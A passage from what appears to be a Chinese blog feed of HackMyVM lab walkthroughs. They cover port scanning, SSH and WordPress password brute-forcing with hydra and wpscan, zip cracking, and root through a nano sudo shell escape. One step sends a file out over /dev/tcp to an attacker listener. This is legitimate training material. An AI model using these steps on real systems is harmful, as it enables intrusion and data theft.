​`fzf`​ 是一个交互式命令行模糊查找工具，并且其 `--listen`​ 选项允许它接收来自远程连接的命令。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Doll.html</guid><pubDate>Fri, 27 Jun 2025 09:33:03 +0000</pubDate></item><item><title>hmv_Deeper</title><link>https://7r1UMPHK.github.io/post/hmv_Deeper.html</link><description># hmv_Deeper

# 0.简介

**靶机**：[hackmyvm - Deeper](https://hackmyvm.eu/machines/machine.php?vm=Deeper)
**难度**：绿色
**目标 IP**：192.168.205.143
**本机 IP**：192.168.205.141

# 1.扫描

`nmap`起手

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.143 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-20 16:34 CST
Nmap scan report for 192.168.205.143
Host is up (0.00046s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:49:23:DF (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.54 seconds
```

# 2.踩点

![Image](https://github.com/user-attachments/assets/91ecf9bd-ad4e-46cc-a738-92bfc7524a8b)

加上

![Image](https://github.com/user-attachments/assets/a2ee96a4-dce7-48ce-b94c-68125e7b3459)

![Image](https://github.com/user-attachments/assets/f7e4d481-8c35-47be-ba4d-88c63577b3c6)

![Image](https://github.com/user-attachments/assets/6ca74cb9-75f8-49fe-8abb-fb13d0bd5c02)

解码（[cyberchef](https://cyberchef.org/)）

![Image](https://github.com/user-attachments/assets/5a25d1be-e84d-4793-948c-0a3678f8ceaa)

![Image](https://github.com/user-attachments/assets/c68825cd-5fbd-459d-aed3-0a45900572b1)

# 3.提权

```bash
┌──(kali㉿kali)-[~/test]
└─$ ssh alice@192.168.205.143                                             
The authenticity of host '192.168.205.143 (192.168.205.143)' can't be established.
ED25519 key fingerprint is SHA256:LsWOF4O2aDb/w6V7Z5VEAcjNfkxMmPOzyEIC7HMr91o.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.143' (ED25519) to the list of known hosts.
alice@192.168.205.143's password: 
Linux deeper 6.1.0-11-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.38-4 (2023-08-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Aug 26 00:38:16 2023 from 192.168.100.103
alice@deeper:~$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice)
alice@deeper:~$ sudo -l
[sudo] password for alice: 
Sorry, user alice may not run sudo on deeper.
alice@deeper:~$ ls -la
total 32
drwxr--r-- 3 alice alice 4096 Aug 26  2023 .
drwxr-xr-x 4 root  root  4096 Aug 25  2023 ..
lrwxrwxrwx 1 alice alice    9 Aug 25  2023 .bash_history -&gt; /dev/null
-rw-r--r-- 1 alice alice  220 Aug 25  2023 .bash_logout
-rw-r--r-- 1 alice alice 3526 Aug 25  2023 .bashrc
-rw-r--r-- 1 alice alice   41 Aug 25  2023 .bob.txt
drwxr-xr-x 3 alice alice 4096 Aug 26  2023 .local
-rw-r--r-- 1 alice alice  807 Aug 25  2023 .profile
-rw-r--r-- 1 alice alice   33 Aug 26  2023 user.txt
alice@deeper:~$ cat .bob.txt
535746745247566c634556756233566e61413d3d

```

![Image](https://github.com/user-attachments/assets/6cba623b-f063-4b85-93e5-72e751571700)

```bash
alice@deeper:/home$ su - bob
Password: 
bob@deeper:~$ id
uid=1001(bob) gid=1001(bob) groups=1001(bob)
bob@deeper:~$ sudo -l
[sudo] password for bob: 
Sorry, user bob may not run sudo on deeper.
bob@deeper:~$ ls -la
total 28
drwxr--r-- 3 bob  bob  4096 Aug 26  2023 .
drwxr-xr-x 4 root root 4096 Aug 25  2023 ..
lrwxrwxrwx 1 bob  bob     9 Aug 25  2023 .bash_history -&gt; /dev/null
-rw-r--r-- 1 bob  bob   220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 bob  bob  3526 Apr 23  2023 .bashrc
drwxr-xr-x 3 bob  bob  4096 Aug 25  2023 .local
-rw-r--r-- 1 bob  bob   807 Aug 25  2023 .profile
-rw-r--r-- 1 bob  bob   215 Aug 26  2023 root.zip
bob@deeper:~$ cat root.zip &gt; /dev/tcp/192.168.205.141/7777

#kali
┌──(kali㉿kali)-[~/test/tmp]
└─$ nc -lvnp 7777 &gt; root.zip 
listening on [any] 7777 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.143] 40706
                                                 
┌──(kali㉿kali)-[~/test/tmp]
└─$ zip2john root.zip &gt; hash                          
ver 1.0 efh 5455 efh 7875 root.zip/root.txt PKZIP Encr: 2b chk, TS_chk, cmplen=33, decmplen=21, crc=2D649941 ts=BA81 cs=ba81 type=0
                                                                                                                                   
┌──(kali㉿kali)-[~/test/tmp]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
No password hashes left to crack (see FAQ)
                                                                                                                                   
┌──(kali㉿kali)-[~/test/tmp]
└─$ john --show hash                                  
root.zip/root.txt:bob:root.txt:root.zip::root.zip

1 password hash cracked, 0 left                                              
                                 
┌──(kali㉿kali)-[~/test/tmp]
└─$ unzip root.zip
Archive:  root.zip
[root.zip] root.txt password: 
 extracting: root.txt                                                                                                                                               
                                                                                                                                 
┌──(kali㉿kali)-[~/test/tmp]
└─$ cat root.txt
root:IhateMyPassword
                                
```

登录root

```bash
bob@deeper:~$ su -
Password: 
root@deeper:~# id
uid=0(root) gid=0(root) groups=0(root)

```。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Deeper.html</guid><pubDate>Fri, 27 Jun 2025 09:33:00 +0000</pubDate></item><item><title>hmv_Darkside</title><link>https://7r1UMPHK.github.io/post/hmv_Darkside.html</link><description># hmv_Darkside

# 0.简介

**靶机**：[hackmyvm - Darkside](https://hackmyvm.eu/machines/machine.php?vm=Darkside)
**难度**：绿色
**目标 IP**：192.168.205.134
**本机 IP**：192.168.205.141

# 1.扫描

一号男嘉宾，`nmap`开扫

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.134
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-14 10:42 CST
Nmap scan report for 192.168.205.134
Host is up (0.00078s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:2D:1C:16 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.69 seconds                                                 
```

优先查看**http服务**端口，**ssh端口**如果没有进展再进行爆破

# 2.踩点

![image](https://github.com/user-attachments/assets/8432290e-d5d9-4863-9dfc-a43e9145b860)

是个登录页，尝试`sql注入、万能密码、弱密码`均无果，使用`Nikto`进行WEB漏洞扫描

```bash
┌──(kali㉿kali)-[~/test]
└─$ nikto -h 192.168.205.134                       
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.205.134
+ Target Hostname:    192.168.205.134
+ Target Port:        80
+ Start Time:         2025-01-14 10:43:28 (GMT8)
---------------------------------------------------------------------------
+ Server: Apache/2.4.56 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /backup/: Directory indexing found.
+ /backup/: This might be interesting.
+ 8102 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2025-01-14 10:43:50 (GMT8) (22 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

有个备份目录，我们去网页查看一下

![image](https://github.com/user-attachments/assets/8432290e-d5d9-4863-9dfc-a43e9145b860)

只有一个`vote.txt`文本文件，给了我们几个用户名，我们拿这几个用户名去尝试爆破ssh服务

```bash
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.134/backup/vote.txt|awk -F ':' '{print $1}'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   205  100   205    0     0  69751      0 --:--:-- --:--:-- --:--:--  100k
rijaba
xerosec
sml
cromiphi
gatogamer
chema
talleyrand
d3b0o

Since the result was a draw, we will let you enter the darkside, or at least temporarily, good luck kevin.
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ vim user  
                                      
┌──(kali㉿kali)-[~/test]
└─$ cat user
rijaba
xerosec
sml
cromiphi
gatogamer
chema
talleyrand
d3b0o
kevin
                  
┌──(kali㉿kali)-[~/test]
└─$ hydra -L user -P /usr/share/wordlists/q5000.txt ssh://192.168.205.134 -I -u -f -e nsr -t 64 

Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-14 11:04:45
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 45027 login tries (l:9/p:5003), ~704 tries per task
[DATA] attacking ssh://192.168.205.134:22/

```

爆破的同时，我们用burp也爆破登录页

![image](https://github.com/user-attachments/assets/b8ec81f2-f037-4bec-a27e-335aee5329d9)

选这个，设置好参数后启动爆破

![image](https://github.com/user-attachments/assets/f4a491ef-5970-4991-b5e2-83ae8de8d3c7)

按照长度排序，可以发现该组用户密码长度明细不一样，尝试登录

![image](https://github.com/user-attachments/assets/c0b9156f-bbb0-475f-920a-7ed966e0a230)

获得了一串类似于base64的字符串，拿去[cyberchef](https://cyberchef.org/)解密

![image](https://github.com/user-attachments/assets/c0b9156f-bbb0-475f-920a-7ed966e0a230)

（尴尬了，是base58）输出了一串和网址很像的字符串，我们访问一下

![image](https://github.com/user-attachments/assets/1b02d153-2df9-4f83-a249-714cf8196a93)

问我们选哪边，我们查看源码

![image](https://github.com/user-attachments/assets/fe152899-e95a-4487-a6a3-69c1bdc75f10)

代码是实现了当存在名为 **side** 的 **cookie** 并且它的值是 `darkside`，那么脚本将重定向用户到 URL `hwvhysntovtanj.password`，我懒得改**cookie**了，我们直接访问

![image](https://github.com/user-attachments/assets/9bc27d36-69e8-4d83-a178-f695a8e598ce)

获得了一个貌似是**ssh服务**密码，我们尝试一下

```bash
┌──(kali㉿kali)-[~/test]
└─$ ssh kevin@192.168.205.134  
The authenticity of host '192.168.205.134 (192.168.205.134)' can't be established.
ED25519 key fingerprint is SHA256:pmPw9d2/o54jN+Dmo29Hq6rIzWOQ//VhyZvK4KN6rmk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.134' (ED25519) to the list of known hosts.
kevin@192.168.205.134's password: 
Linux darkside 5.10.0-26-amd64 #1 SMP Debian 5.10.197-1 (2023-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Oct 15 15:18:15 2023 from 10.0.2.18
kevin@darkside:~$ id
uid=1000(kevin) gid=1000(kevin) groups=1000(kevin)
```

成功连接

# 3.提权

```bash
kevin@darkside:~$ sudo -l
[sudo] password for kevin: 
Sorry, user kevin may not run sudo on darkside.
kevin@darkside:~$ 
kevin@darkside:~$ ls -la
total 32
drwxr-xr-x 3 kevin kevin 4096 Oct 30  2023 .
drwxr-xr-x 4 root  root  4096 Oct 15  2023 ..
lrwxrwxrwx 1 kevin kevin    9 Oct 30  2023 .bash_history -&gt; /dev/null
-rw-r--r-- 1 kevin kevin  220 Oct 15  2023 .bash_logout
-rw-r--r-- 1 kevin kevin 3526 Oct 15  2023 .bashrc
-rw-r--r-- 1 kevin kevin  113 Oct 15  2023 .history
drwxr-xr-x 3 kevin kevin 4096 Oct 15  2023 .local
-rw-r--r-- 1 kevin kevin  807 Oct 15  2023 .profile
-rw-r--r-- 1 kevin kevin   19 Oct 15  2023 user.txt
kevin@darkside:~$ cat .history
ls -al
hostname -I
echo 'Congratulations on the OSCP Xerosec'
top
ps -faux
su rijaba
ILoveJabita
ls /home/rijaba

```

在家目录发现了`.history`文本文件，查看获得了`rijaba`的密码，尝试登录

```bash
kevin@darkside:~$ su rijaba
Password: 
rijaba@darkside:/home/kevin$ id
uid=1001(rijaba) gid=1001(rijaba) groups=1001(rijaba)
```

继续测试提权

```bash
rijaba@darkside:/home/kevin$ sudo -l
Matching Defaults entries for rijaba on darkside:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User rijaba may run the following commands on darkside:
    (root) NOPASSWD: /usr/bin/nano

```

可以使用**root**运行`nano`，我们进行提权

```bash
rijaba@darkside:/home/kevin$ sudo /usr/bin/nano
```

![image](https://github.com/user-attachments/assets/68590d1b-033a-440d-8aea-5eff83ad1d78)

进入`nano`按**CTRL+R**，**CTRL+X**，输入`reset; sh 1&gt;&amp;0 2&gt;&amp;0`就提权成功了

![image](https://github.com/user-attachments/assets/68590d1b-033a-440d-8aea-5eff83ad1d78)。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Darkside.html</guid><pubDate>Fri, 27 Jun 2025 09:32:57 +0000</pubDate></item><item><title>hmv_crack</title><link>https://7r1UMPHK.github.io/post/hmv_crack.html</link><description># hmv_crack

# 0.简介

**靶机**：[hackmyvm - crack](https://hackmyvm.eu/machines/machine.php?vm=crack)
**难度**：绿色
**目标 IP**：192.168.205.143
**本机 IP**：192.168.205.141

# 1.扫描

`nmap`起手

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.143
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-23 15:51 CST
Nmap scan report for 192.168.205.143
Host is up (0.00043s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
4200/tcp  open  vrml-multi-use
12359/tcp open  unknown
MAC Address: 08:00:27:75:33:75 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.46 seconds

```

`4000、12359`是什么端口我们不知道，所以我们先看**ftp**端口

# 2.踩点

```bash
┌──(kali㉿kali)-[~/test]
└─$ ftp 192.168.205.143                         
Connected to 192.168.205.143.
220 (vsFTPd 3.0.3)
Name (192.168.205.143:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls
229 Entering Extended Passive Mode (|||50526|)
150 Here comes the directory listing.
drwxrwxrwx    2 0        0            4096 Jun 07  2023 upload
226 Directory send OK.
ftp&gt; cd upload
250 Directory successfully changed.
ftp&gt; ls
229 Entering Extended Passive Mode (|||30618|)
150 Here comes the directory listing.
-rwxr-xr-x    1 1000     1000          849 Jun 07  2023 crack.py
226 Directory send OK.
ftp&gt; mget crack.py
mget crack.py [anpqy?]? y
229 Entering Extended Passive Mode (|||35830|)
150 Opening BINARY mode data connection for crack.py (849 bytes).
100% |*****************************************************************************************|   849        1.71 MiB/s    00:00 ETA
226 Transfer complete.
849 bytes received in 00:00 (799.51 KiB/s)
ftp&gt; exit
221 Goodbye.
                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ cat crack.py  
import os
import socket
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
port = 12359
s.bind(('', port))
s.listen(50)

c, addr = s.accept()
no = 'NO'
while True:
        try:
                c.send('File to read:'.encode())
                data = c.recv(1024)
                file = (str(data, 'utf-8').strip())
                filename = os.path.basename(file)
                check = '/srv/ftp/upload/'+filename
                if os.path.isfile(check) and os.path.isfile(file):
                        f = open(file,'r')
                        lines = f.readlines()
                        lines = str(lines)
                        lines = lines.encode()
                        c.send(lines)
                else:
                        c.send(no.encode())
        except ConnectionResetError:
                pass

```

发现了`12359`端口的运行脚本，脚本实现文件读取服务。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_crack.html</guid><pubDate>Fri, 27 Jun 2025 09:32:54 +0000</pubDate></item><item><title>hmv_CodeShield</title><link>https://7r1UMPHK.github.io/post/hmv_CodeShield.html</link><description># hmv_CodeShield

# 0.简介

**靶机**：[hackmyvm - CodeShield](https://hackmyvm.eu/machines/machine.php?vm=CodeShield)
**难度**：绿色
**目标 IP**：192.168.205.138
**本机 IP**：192.168.205.141

# 1.扫描

`nmap`起手

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn -sV 192.168.205.138
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-20 10:33 CST
Nmap scan report for 192.168.205.138
Host is up (0.046s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           vsftpd 3.0.5
80/tcp    open  http          nginx
110/tcp   open  pop3          Dovecot pop3d
143/tcp   open  imap          Dovecot imapd (Ubuntu)
443/tcp   open  ssl/http      nginx
993/tcp   open  imaps?
995/tcp   open  pop3s?
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
22222/tcp open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
MAC Address: 08:00:27:61:49:1F (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.22 seconds
```

先把我们感兴趣的端口挑出来`21、80、443、22222`，现在就这几个，后面没有头绪再挑

# 2.踩点

我比较喜欢先看ftp21端口。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_CodeShield.html</guid><pubDate>Fri, 27 Jun 2025 09:32:51 +0000</pubDate></item><item><title>hmv_Chromatica</title><link>https://7r1UMPHK.github.io/post/hmv_Chromatica.html</link><description># hmv_Chromatica

**靶机**：https://hackmyvm.eu/machines/machine.php?vm\=Chromatica
**难度**：绿色
**目标 IP**：192.168.205.215
**本机** IP：192.168.205.141

---

### **1. 端口枚举及服务探测**

首先，使用 `nmap` 扫描目标 IP 的开放端口：

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sV -sT -O -Pn -n -p- 192.168.205.215
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-30 14:18 CST
Nmap scan report for 192.168.205.215
Host is up (0.0017s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
5353/tcp open  domain  dnsmasq 2.86
MAC Address: 08:00:27:95:39:FD (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.66 seconds
```

扫描结果显示目标机器开放了 22 (SSH) 、 80 (HTTP) 、5353(DNS)端口。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Chromatica.html</guid><pubDate>Fri, 27 Jun 2025 09:32:48 +0000</pubDate></item><item><title>hmv_canto</title><link>https://7r1UMPHK.github.io/post/hmv_canto.html</link><description># hmv_canto

**靶机**：https://hackmyvm.eu/machines/machine.php?vm=canto
**难度**：绿色
**目标 IP**：192.168.205.213
**本机** IP：192.168.205.141

---

### **1. 端口枚举及服务探测**

首先，使用 `nmap` 扫描目标 IP 的开放端口：

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sV -sT -O -Pn -n -p- 192.168.205.213
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-29 19:05 CST
Nmap scan report for 192.168.205.213
Host is up (0.00026s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.3p1 Ubuntu 1ubuntu3.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.57 ((Ubuntu))
MAC Address: 08:00:27:80:A9:92 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.13 seconds

```

扫描结果显示目标机器开放了 22 (SSH) 和 80 (HTTP) 端口。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_canto.html</guid><pubDate>Fri, 27 Jun 2025 09:32:44 +0000</pubDate></item><item><title>hmv_buster</title><link>https://7r1UMPHK.github.io/post/hmv_buster.html</link><description># hmv_buster

# 0.简介

**靶机**：[hackmyvm - buster](https://hackmyvm.eu/machines/machine.php?vm=buster)
**难度**：绿色
**目标 IP**：192.168.205.142
**本机 IP**：192.168.205.141

# 1.扫描

`nmap`起手

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.142
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-15 20:11 CST
Nmap scan report for 192.168.205.142
Host is up (0.00022s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:09:D8:74 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.40 seconds

```

先看**80端口**，**22端口**候补

# 2.踩点

![image](https://github.com/user-attachments/assets/9eb492e1-d1d8-4170-bb5f-990d1792265b)
是个**wordPress，**  拿**wpscan**扫描一下

```bash
┌──(kali㉿kali)-[~/test]
└─$ wpscan --url http://192.168.205.142/ -e vp,u --api-token xxx   #api-token注册wpscan官网获取
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.205.142/ [192.168.205.142]
[+] Started: Wed Jan 15 20:13:50 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: nginx/1.14.2
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://192.168.205.142/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.205.142/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.205.142/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.205.142/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.7.1 identified (Latest, released on 2024-11-21).
 | Found By: Meta Generator (Passive Detection)
 |  - http://192.168.205.142/, Match: 'WordPress 6.7.1'
 | Confirmed By: Rss Generator (Aggressive Detection)
 |  - http://192.168.205.142/feed/, &lt;generator&gt;https://wordpress.org/?v=6.7.1&lt;/generator&gt;
 |  - http://192.168.205.142/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=6.7.1&lt;/generator&gt;

[i] The main theme could not be detected.

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 &lt;========================================================&gt; (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] ta0
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://192.168.205.142/wp-json/wp/v2/users/?per_page=100&amp;page=1
 | Confirmed By:
 |  Rss Generator (Aggressive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] welcome
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 1
 | Requests Remaining: 18

[+] Finished: Wed Jan 15 20:13:57 2025
[+] Requests Done: 53
[+] Cached Requests: 6
[+] Data Sent: 13.267 KB
[+] Data Received: 413.04 KB
[+] Memory used: 229.277 MB
[+] Elapsed time: 00:00:07
                                                     
```

主要的信息有`WordPress 6.7.1`和两个用户名`ta0`、`welcome`，但是`WordPress 6.7.1`没有漏洞，只可以爆破密码了

```bash
┌──(kali㉿kali)-[~/test]
└─$ wpscan -U ta0,welcome -P /usr/share/wordlists/q5000.txt --url http://192.168.205.142/             
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

（省略）

[+] Performing password attack on Xmlrpc against 2 user/s
Trying ta0 / speaker Time: 00:01:37 &lt;=========================================================&gt; (10000 / 10000) 100.00% Time: 00:01:37

[i] No Valid Passwords Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Jan 15 20:18:29 2025
[+] Requests Done: 10142
[+] Cached Requests: 34
[+] Data Sent: 5.147 MB
[+] Data Received: 5.559 MB
[+] Memory used: 278.031 MB
[+] Elapsed time: 00:01:40

```

爆破了前5000行`rockyou.txt`都没有结果，没有必要爆破了，根据现在获得的信息无法判断出攻击面，但是`WordPress`靶机还有一个攻击点——**插件**

```bash
┌──(kali㉿kali)-[~/test]
└─$ wpscan --url http://192.168.205.142/ -e ap --plugins-detection aggressive --api-token xxx   #api-token注册wpscan官网获取
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________
（省略）

[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:17:12 &lt;================================================&gt; (108550 / 108550) 100.00% Time: 00:17:12
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://192.168.205.142/wp-content/plugins/akismet/
 | Latest Version: 5.3.5 (up to date)
 | Last Updated: 2024-11-19T02:02:00.000Z
 | Readme: http://192.168.205.142/wp-content/plugins/akismet/readme.txt
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.205.142/wp-content/plugins/akismet/, status: 200
 |
 | Version: 5.3.5 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.205.142/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.205.142/wp-content/plugins/akismet/readme.txt

[+] feed
 | Location: http://192.168.205.142/wp-content/plugins/feed/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.205.142/wp-content/plugins/feed/, status: 200
 |
 | The version could not be determined.

[+] wp-query-console
